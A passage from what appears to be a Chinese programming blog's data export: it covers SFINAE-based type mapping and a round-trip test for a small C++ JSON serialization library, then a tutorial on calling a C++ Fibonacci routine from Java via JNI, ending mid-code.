class=\"built_in\">find</span>(key)-&gt;second;</span><br><span class=\"line\">    CastFromJsonElement&lt;T&gt;(ele, field);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>其中<code>CastToJsonElement(JsonElement &amp; ele, const T &amp; value)</code>和<code>CastFromJsonElement(const JsonElement &amp; ele, T &amp; value)</code>是定义了某一<code>JsonElement</code>和<code>T</code>类型直线转化关系的模板函数。后续我们需要针对不同的类型逐一实现他们。</p>\n<p>如果<code>T</code>类型本身是一个已经定义了<code>__XURANUS_JSON_SERIALIZATION_MAGIC__</code>的结构，我们可以递归调用其中的<code>_XURANUS_JSON_CPP_SERIALIZE_METHOD_</code>方法来实现类型映射：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cast between struct and JsonElement</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">auto</span> <span class=\"title\">CastFromJsonElement</span><span class=\"params\">(<span class=\"keyword\">const</span> JsonElement&amp; ele, T&amp; value)</span> -&gt; <span class=\"title\">decltype</span><span class=\"params\">(<span class=\"keyword\">typename</span> T::__XURANUS_JSON_SERIALIZATION_MAGIC__())</span> </span>&#123;</span><br><span class=\"line\">    JsonObject object = ele.<span class=\"built_in\">ToJsonObject</span>();</span><br><span class=\"line\">    value._XURANUS_JSON_CPP_SERIALIZE_METHOD_(object, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T&gt;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">auto</span> <span class=\"title\">CastToJsonElement</span><span class=\"params\">(JsonElement&amp; ele, <span class=\"keyword\">const</span> T&amp; value)</span> -&gt; <span class=\"title\">decltype</span><span class=\"params\">(<span class=\"keyword\">typename</span> T::__XURANUS_JSON_SERIALIZATION_MAGIC__())</span> </span>&#123;</span><br><span class=\"line\">    JsonObject object&#123;&#125;;</span><br><span class=\"line\">    T* valueRef = <span class=\"keyword\">reinterpret_cast</span>&lt;T*&gt;((<span class=\"keyword\">void</span>*)&amp;value);</span><br><span class=\"line\">    valueRef-&gt;_XURANUS_JSON_CPP_SERIALIZE_METHOD_(object, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(object);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>我们将这复合一类型的模板作为主模板，利用SFINAE来进一步定义更多基础类型的映射模板：</p>\n<p>字符串类型：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cast between std::string and JsonElement</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;std::is_same&lt;T, std::string&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastFromJsonElement</span>(<span class=\"keyword\">const</span> JsonElement&amp; ele, T&amp; value) &#123;</span><br><span class=\"line\">    value = ele.<span class=\"built_in\">ToString</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;std::is_same&lt;T, std::string&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastToJsonElement</span>(JsonElement&amp; ele, <span class=\"keyword\">const</span> T&amp; value) &#123;</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(value);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>数字类型：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cast between numeric and JsonElement</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;(std::is_integral&lt;T&gt;::value || std::is_floating_point&lt;T&gt;::value)</span><br><span class=\"line\">    &amp;&amp; !std::is_same&lt;T, <span class=\"keyword\">bool</span>&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastFromJsonElement</span>(<span class=\"keyword\">const</span> JsonElement&amp; ele, T&amp; value) &#123;</span><br><span class=\"line\">    value = <span class=\"keyword\">static_cast</span>&lt;T&gt;(ele.<span class=\"built_in\">ToNumber</span>());</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;std::is_integral&lt;T&gt;::value &amp;&amp; !std::is_same&lt;T, <span class=\"keyword\">bool</span>&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastToJsonElement</span>(JsonElement&amp; ele, <span class=\"keyword\">const</span> T&amp; value) &#123;</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(<span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">long</span>&gt;(value));</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;std::is_floating_point&lt;T&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastToJsonElement</span>(JsonElement&amp; ele, <span class=\"keyword\">const</span> T&amp; value) &#123;</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(<span class=\"keyword\">static_cast</span>&lt;<span class=\"keyword\">double</span>&gt;(value));</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>布尔类型：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cast between bool and JsonElement</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;std::is_same&lt;T, <span class=\"keyword\">bool</span>&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastFromJsonElement</span>(<span class=\"keyword\">const</span> JsonElement&amp; ele, T&amp; value) &#123;</span><br><span class=\"line\">    value = ele.<span class=\"built_in\">ToBool</span>();</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;std::is_same&lt;T, <span class=\"keyword\">bool</span>&gt;::value&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastToJsonElement</span>(JsonElement&amp; ele, <span class=\"keyword\">const</span> T&amp; value) &#123;</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(value);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>std::vector</code>和<code>std::list</code>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cast between std::vector or std::list and JsonElement</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;</span><br><span class=\"line\">    std::is_same&lt;T, std::vector&lt;<span class=\"keyword\">typename</span> T::value_type&gt;&gt;::value ||</span><br><span class=\"line\">    std::is_same&lt;T, std::list&lt;<span class=\"keyword\">typename</span> T::value_type&gt;&gt;::value</span><br><span class=\"line\">&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastFromJsonElement</span>(<span class=\"keyword\">const</span> JsonElement &amp; ele, T &amp; value) &#123;</span><br><span class=\"line\">    JsonArray array = ele.<span class=\"built_in\">ToJsonArray</span>();</span><br><span class=\"line\">    value.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> JsonElement&amp; eleItem : array) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">typename</span> T::value_type t;</span><br><span class=\"line\">        CastFromJsonElement&lt;<span class=\"keyword\">typename</span> T::value_type&gt;(eleItem, t);</span><br><span class=\"line\">        value.<span class=\"built_in\">push_back</span>(t);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;</span><br><span class=\"line\">    std::is_same&lt;T, std::vector&lt;<span class=\"keyword\">typename</span> T::value_type&gt;&gt;::value ||</span><br><span class=\"line\">    std::is_same&lt;T, std::list&lt;<span class=\"keyword\">typename</span> T::value_type&gt;&gt;::value</span><br><span class=\"line\">&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastToJsonElement</span>(JsonElement &amp; ele, <span class=\"keyword\">const</span> T &amp; value) &#123;</span><br><span class=\"line\">    JsonArray array;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> <span class=\"keyword\">typename</span> T::value_type&amp; item : value) &#123;</span><br><span class=\"line\">        JsonElement itemElement;</span><br><span class=\"line\">        CastToJsonElement&lt;<span class=\"keyword\">typename</span> T::value_type&gt;(itemElement, item);</span><br><span class=\"line\">        array.<span class=\"built_in\">push_back</span>(itemElement);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(array);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br><code>std::map</code>和<code>std::unordered_map</code>：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// cast between std::map and JsonElement</span></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;</span><br><span class=\"line\">    std::is_same&lt;std::string, <span class=\"keyword\">typename</span> T::key_type&gt;::value &amp;&amp; (</span><br><span class=\"line\">        std::is_same&lt;T, std::map&lt;std::string, <span class=\"keyword\">typename</span> T::mapped_type&gt;&gt;::value ||</span><br><span class=\"line\">        std::is_same&lt;T, std::unordered_map&lt;std::string, <span class=\"keyword\">typename</span> T::mapped_type&gt;&gt;::value</span><br><span class=\"line\">        )&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastFromJsonElement</span>(<span class=\"keyword\">const</span> JsonElement&amp; ele, T&amp; value) &#123;</span><br><span class=\"line\">    JsonObject object = ele.<span class=\"built_in\">ToJsonObject</span>();</span><br><span class=\"line\">    value.<span class=\"built_in\">clear</span>();</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::pair&lt;std::string, JsonElement&gt;&amp; p : object) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">typename</span> T::mapped_type v;</span><br><span class=\"line\">        CastFromJsonElement&lt;<span class=\"keyword\">typename</span> T::mapped_type&gt;(p.second, v);</span><br><span class=\"line\">        value[p.first] = v;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> T, <span class=\"keyword\">typename</span> std::enable_if&lt;</span><br><span class=\"line\">    std::is_same&lt;std::string, <span class=\"keyword\">typename</span> T::key_type&gt;::value &amp;&amp; (</span><br><span class=\"line\">        std::is_same&lt;T, std::map&lt;std::string, <span class=\"keyword\">typename</span> T::mapped_type&gt;&gt;::value ||</span><br><span class=\"line\">        std::is_same&lt;T, std::unordered_map&lt;std::string, <span class=\"keyword\">typename</span> T::mapped_type&gt;&gt;::value</span><br><span class=\"line\">        )&gt;::type* = <span class=\"literal\">nullptr</span>&gt;</span><br><span class=\"line\"><span class=\"keyword\">void</span> <span class=\"built_in\">CastToJsonElement</span>(JsonElement&amp; ele, <span class=\"keyword\">const</span> T&amp; value) &#123;</span><br><span class=\"line\">    JsonObject object;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">const</span> std::pair&lt;std::string, <span class=\"keyword\">typename</span> T::mapped_type&gt;&amp; p : value) &#123;</span><br><span class=\"line\">        JsonElement valueElement;</span><br><span class=\"line\">        CastToJsonElement&lt;<span class=\"keyword\">typename</span> T::mapped_type&gt;(valueElement, p.second);</span><br><span class=\"line\">        object[p.first] = valueElement;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    ele = <span class=\"built_in\">JsonElement</span>(object);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>到此位置，该JSON库的所有功能都已实现了，来跑一个复杂点的用例：<br><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Book</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    std::string m_name;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> m_id;</span><br><span class=\"line\">    <span class=\"keyword\">float</span> m_price;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> m_soldOut;</span><br><span class=\"line\">    std::vector&lt;std::string&gt; m_tags;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">SERIALIZE_SECTION_BEGIN</span></span><br><span class=\"line\"><span class=\"function\">    <span class=\"title\">SERIALIZE_FIELD</span><span class=\"params\">(name, m_name)</span></span>;</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(id, m_id);</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(price, m_price);</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(soldOut, m_soldOut);</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(tags, m_tags);</span><br><span class=\"line\">    SERIALIZE_SECTION_END</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">Author</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    std::string m_name;</span><br><span class=\"line\">    std::list&lt;Book&gt; m_books;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\">SERIALIZE_SECTION_BEGIN</span></span><br><span class=\"line\"><span class=\"function\">    <span class=\"title\">SERIALIZE_FIELD</span><span class=\"params\">(name, m_name)</span></span>;</span><br><span class=\"line\">    <span class=\"built_in\">SERIALIZE_FIELD</span>(books, m_books);</span><br><span class=\"line\">    SERIALIZE_SECTION_END</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">bool</span> <span class=\"keyword\">operator</span>==(<span class=\"keyword\">const</span> Book &amp;book1, <span class=\"keyword\">const</span> Book &amp;book2)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"built_in\"><span class=\"keyword\">return</span></span> (book1.m_name == book2.m_name &amp;&amp;</span><br><span class=\"line\">            book1.m_id == book2.m_id &amp;&amp;</span><br><span class=\"line\">            book1.m_price == book2.m_price &amp;&amp;</span><br><span class=\"line\">            book1.m_soldOut == book2.m_soldOut &amp;&amp;</span><br><span class=\"line\">            book1.m_tags == book2.m_tags);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">TEST</span>(SerializationTest, NestedStructSerialization)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tBook book1&#123;&#125;;</span><br><span class=\"line\">\tbook1.m_name = <span class=\"string\">&quot;C++ Primer&quot;</span>;</span><br><span class=\"line\">\tbook1.m_id = <span class=\"number\">114514</span>;</span><br><span class=\"line\">\tbook1.m_price = <span class=\"number\">114.5</span>;</span><br><span class=\"line\">\tbook1.m_soldOut = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\tbook1.m_tags = &#123;<span class=\"string\">&quot;C++&quot;</span>, <span class=\"string\">&quot;Programming&quot;</span>, <span class=\"string\">&quot;Language&quot;</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tBook book2&#123;&#125;;</span><br><span class=\"line\">\tbook2.m_name = <span class=\"string\">&quot;Essential C++&quot;</span>;</span><br><span class=\"line\">\tbook2.m_id = <span class=\"number\">1919810</span>;</span><br><span class=\"line\">\tbook2.m_price = <span class=\"number\">19.19</span>;</span><br><span class=\"line\">\tbook2.m_soldOut = <span class=\"literal\">false</span>;</span><br><span class=\"line\">\tbook2.m_tags = &#123;<span class=\"string\">&quot;Programming&quot;</span>, <span class=\"string\">&quot;Computer Science&quot;</span>&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tAuthor author1&#123;&#125;;</span><br><span class=\"line\">\tauthor1.m_name = <span class=\"string\">&quot;Stanley B. LippmanBarbara E. Moo JoséeLaJoie&quot;</span>;</span><br><span class=\"line\">\tauthor1.m_books = &#123;book1, book2&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">\tAuthor author2&#123;&#125;;</span><br><span class=\"line\">\tstd::string jsonStr = util::<span class=\"built_in\">Serialize</span>(author1);</span><br><span class=\"line\">\tutil::<span class=\"built_in\">Deserialize</span>(jsonStr, author2);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"built_in\">EXPECT_EQ</span>(author2.m_name, author1.m_name);</span><br><span class=\"line\">\t<span class=\"built_in\">EXPECT_EQ</span>(author2.m_books, author1.m_books);</span><br><span class=\"line\"></span><br><span class=\"line\">\tJsonElement ele = <span class=\"built_in\">JsonParser</span>(jsonStr).<span class=\"built_in\">Parse</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">EXPECT_TRUE</span>(ele.<span class=\"built_in\">IsJsonObject</span>());</span><br><span class=\"line\">\tJsonObject authorObject = ele.<span class=\"built_in\">AsJsonObject</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">EXPECT_TRUE</span>(authorObject[<span class=\"string\">&quot;name&quot;</span>].<span class=\"built_in\">IsString</span>());</span><br><span class=\"line\">\t<span class=\"built_in\">EXPECT_TRUE</span>(authorObject[<span class=\"string\">&quot;books&quot;</span>].<span class=\"built_in\">IsJsonArray</span>());</span><br><span class=\"line\">\tJsonArray booksArray = authorObject[<span class=\"string\">&quot;books&quot;</span>].<span class=\"built_in\">AsJsonArray</span>();</span><br><span class=\"line\">\t<span class=\"built_in\">EXPECT_EQ</span>(booksArray[<span class=\"number\">0</span>].<span class=\"built_in\">AsJsonObject</span>()[<span class=\"string\">&quot;name&quot;</span>].<span class=\"built_in\">AsString</span>(), <span class=\"string\">&quot;C++ Primer&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>完整项目代码见：<a href=\"https://github.com/XUranus/minijson\">https://github.com/XUranus/minijson</a></p>\n<h3 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h3><blockquote>\n<ul>\n<li><a href=\"https://www.json.org/json-en.html\">https://www.json.org/json-en.html</a></li>\n</ul>\n</blockquote>\n","tags":["CPP"]},{"title":"用JNI实现Java调用C++程序","url":"/2021/06/24/%E7%94%A8JNI%E5%AE%9E%E7%8E%B0Java%E8%B0%83%E7%94%A8C-%E7%A8%8B%E5%BA%8F/","content":"<p>用deep-learning-4j在Spring项目中集成深度学习模块的时候，目录中出现了一个.so动态链接库文件，我猜到这也许就是所谓的深度学习Backend，用于使用GPU加速计算，于是便对Java中调用本地程序的过程产生了兴趣，想写个Demo来验证以下。</p>\n<blockquote>\n<p>环境：Linux</p>\n</blockquote>\n<p>以一个Fibonacci数列为例，我们想让他作为native方法存在，而不是用Java实现。定义一个<code>Fibonacci</code>类，声明两个方法：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Fibonacci</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">int</span> i)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>本地方法需要<code>native</code>关键字修饰，且无方法体。<code>init()</code>用于初始化一个Fibonacci表，<code>get(i)</code>用于返回序列某个值。用<code>javah Fibonacci</code>生成一个<code>Fibonacci.h</code>头文件：</p>\n<span id=\"more\"></span>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* DO NOT EDIT THIS FILE - it is machine generated */</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;jni.h&gt;</span></span></span><br><span class=\"line\"><span class=\"comment\">/* Header for class Fibonacci */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifndef</span> _Included_Fibonacci</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> _Included_Fibonacci</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"string\">&quot;C&quot;</span> &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Class:     Fibonacci</span></span><br><span class=\"line\"><span class=\"comment\"> * Method:    init</span></span><br><span class=\"line\"><span class=\"comment\"> * Signature: ()V</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\">JNIEXPORT <span class=\"keyword\">void</span> JNICALL <span class=\"title\">Java_Fibonacci_init</span></span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"params\">(JNIEnv *, jclass)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\"> * Class:     Fibonacci</span></span><br><span class=\"line\"><span class=\"comment\"> * Method:    get</span></span><br><span class=\"line\"><span class=\"comment\"> * Signature: (I)I</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\">JNIEXPORT jint JNICALL <span class=\"title\">Java_Fibonacci_get</span></span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"params\">(JNIEnv *, jclass, jint)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">ifdef</span> __cplusplus</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<p>头文件中包含了上述两个本地方法的声明，第一个参数是<code>JNIEnv*</code>类型，由于Java中是静态方法，第二个参数是<code>jClass</code>类型，之后的参数对应是Java方法的参数列表。接着只需要实现他们即可，创建<code>Fibonacci.cpp</code>，在其中对上述两个方法写实现。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Fibonacci.cpp</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;Fibonacci.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> MAXN 100</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> value[MAXN];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">JNIEXPORT <span class=\"keyword\">void</span> JNICALL <span class=\"title\">Java_Fibonacci_init</span></span></span><br><span class=\"line\"><span class=\"function\"> <span class=\"params\">(JNIEnv *env, jclass klass)</span> </span>&#123;</span><br><span class=\"line\">         value[<span class=\"number\">0</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">         value[<span class=\"number\">1</span>] = <span class=\"number\">1</span>;</span><br><span class=\"line\">         <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">2</span>; i &lt; MAXN; i++) &#123;</span><br><span class=\"line\">                value[i] = value[i - <span class=\"number\">1</span>] + value[i - <span class=\"number\">2</span>];</span><br><span class=\"line\">         &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\">JNIEXPORT jint JNICALL <span class=\"title\">Java_Fibonacci_get</span></span></span><br><span class=\"line\"><span class=\"function\">  <span class=\"params\">(JNIEnv *env, jclass klass, jint i)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(i &lt; MAXN) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> value[i];</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>接着将本地程序编译成动态链接库即可。编译动态链接库需要用到<code>jni.h</code>和<code>jni_md.h</code>，其中<code>jni.h</code>位于<code>$JAVA_HOME/include/jni.h</code>，而<code>jni_md.h</code>在Linux下位于<code>$JAVA_HOME/include/linux/jni_md.h</code>，在Windows下位于<code>$JAVA_HOME/include/win32</code>。将他们拷贝到当前路径下，修改头文件中的<code>#include &lt;jni.h&gt;</code>为<code>#include &quot;jni.h&quot;</code>，然后编译即可。<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp $JAVA_HOME/include/jni.h .</span><br><span class=\"line\">cp $JAVA_HOME/include/linux/jni_md.h . #$JAVA_HOME/include/win32 if windows</span><br><span class=\"line\">g++ -shared -fPIC Fibonacci.cpp -o libfibonacci.so</span><br></pre></td></tr></table></figure></p>\n<p>编译生成动态链接库<code>libfibonacci.so</code>，只需要将他加载进内存，就可以调用绑定他的native方法了。可以用<code>System.loadLibrary(&quot;fibonacci&quot;)</code>加载<code>fibonacci</code>库，也可以用<code>System.load(&quot;/xxx/xxxx/libfibonacci.so&quot;)</code>指定<code>.so</code>文件的绝对路径。一般加载过程写在绑定他的类的静态代码块中，在类加载的时候加载。动态链接库的加载可以写在任何地方，加载一次即可。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Fibonacci</span> </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">\t\tSystem.loadLibrary(<span class=\"string\">&quot;fibonacci&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">init</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">native</span> <span class=\"keyword\">static</span> <span class=\"keyword\">int</span> <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">int</span> i)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>需要注意的是，<code>System.loadLibrary</code>的加载方式必须把库的位置添加到环境变量<code>java.library.path</code>中</p>\n</blockquote>\n<p>最后在调用<code>Fibonacci</code>提供的本地方法测试：<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span 